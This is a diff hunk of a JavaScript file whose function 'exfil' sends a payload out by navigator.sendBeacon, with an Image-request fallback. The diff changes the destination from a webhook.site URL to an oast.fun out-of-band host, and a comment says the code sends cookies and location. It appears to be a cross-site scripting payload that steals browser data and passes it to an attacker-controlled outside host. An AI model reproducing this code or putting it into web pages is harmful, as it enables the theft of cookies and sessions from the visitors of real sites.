@@ -9,12 +9,12 @@ function exfil(data) {
     
     // Try sendBeacon (best)
     if (navigator.sendBeacon) {
-        navigator.sendBeacon("https://webhook.site/66e746ee-1738-4e81-8a1c-28d729ae6f31/exfil", payload);
+        navigator.sendBeacon("https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil", payload);
     }
     
     // Fallback with Image
     const img = new Image();
-    img.src = "https://webhook.site/66e746ee-1738-4e81-8a1c-28d729ae6f31/exfil?data=" + encodeURIComponent(payload);
+    img.src = "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil?data=" + encodeURIComponent(payload);
 }
 
 // Send cookies + location
